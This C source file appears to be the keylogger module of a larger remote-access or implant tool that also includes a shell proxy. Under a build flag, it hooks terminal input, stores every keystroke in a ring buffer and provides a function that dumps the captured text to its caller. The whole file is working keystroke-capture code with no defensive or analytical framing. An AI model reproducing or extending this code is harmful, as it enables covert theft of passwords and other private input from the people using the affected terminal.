#include "config.h"
#include "shellproxy.h"
#include "keylog.h"

#ifdef CFG_KEYLOGGER

#include "ttylog.h"

#define KEYLOG_RING KEYLOG_RING_SIZE

static char keylog_ring[KEYLOG_RING];
static size_t keylog_head;
static size_t keylog_tail;

static
void keylog_input (void* arg, const char* data, size_t len)
{
	(void)arg;
	for (size_t i=0; i<len; i++) {
		keylog_ring[keylog_head % KEYLOG_RING] = data[i];
		keylog_head++;
		if (keylog_head-keylog_tail > KEYLOG_RING)
			keylog_tail = keylog_head-KEYLOG_RING;
	}
}

void keylog_start (void)
{
	keylog_head = keylog_tail = 0;
	ttylog_start(keylog_input, NULL);
}

void keylog_stop (void)
{
	ttylog_stop();
}

int keylog_dump (char* out, int outsz)
{
	size_t n = keylog_head-keylog_tail;

	if (n>(size_t)outsz)
		n = outsz;
	for (size_t i=0; i<n; i++)
		out[i] = keylog_ring[(keylog_tail+i) % KEYLOG_RING];
	return ((int)n);
}

#endif
